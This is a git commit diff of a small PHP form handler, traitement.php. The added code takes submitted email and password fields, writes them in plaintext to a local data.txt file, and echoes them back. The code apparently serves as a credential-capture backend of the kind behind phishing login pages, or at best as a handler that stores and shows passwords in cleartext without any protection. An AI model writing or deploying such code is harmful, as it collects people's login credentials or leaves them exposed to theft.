1086d326527ebb1dcae0c72f206da129b203593f
Zecoutornado <146773239+Zecoutornado@users.noreply.github.com>
2024-06-24 16:04:30 +0200

    Update traitement.php

--- traitement.php
+++ traitement.php
@@ -1,17 +1,14 @@
 <?php
-// Vérifier si le script est exécuté en ligne de commande ou en tant que script web
-if (php_sapi_name() === 'cli') {
-    // Traitement pour l'exécution en ligne de commande
-    if ($argc > 1) {
-        parse_str( $argv[1], $_POST );
-    }
-} else 
-    // Traitement pour l'exécution en tant que script web
-    if ($_SERVER["REQUEST_METHOD"] == "POST") {
-        $email = isset($_POST["email"]) ? $_POST["email"] : "";
-        $password = isset($_POST["password"]) ? $_POST["password"] : "";
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $email = isset($_POST["email"]) ? $_POST["email"] : "";
+    $password = isset($_POST["password"]) ? $_POST["password"] : "";
 
-        // Affichage dans le terminal (console)
-        echo "Email : " . $email . "\n";
-        echo "Mot de passe : " . $password . "\n";
-    }
+    // Ecrire les informations dans un fichier
+    $file = 'data.txt';
+    file_put_contents($file, "Email: " . $email . PHP_EOL . "Mot de passe: " . $password . PHP_EOL);
+
+    // Affichage dans le terminal (console)
+    echo "Email : " . $email . "\n";
+    echo "Mot de passe : " . $password . "\n";
+}
+?>
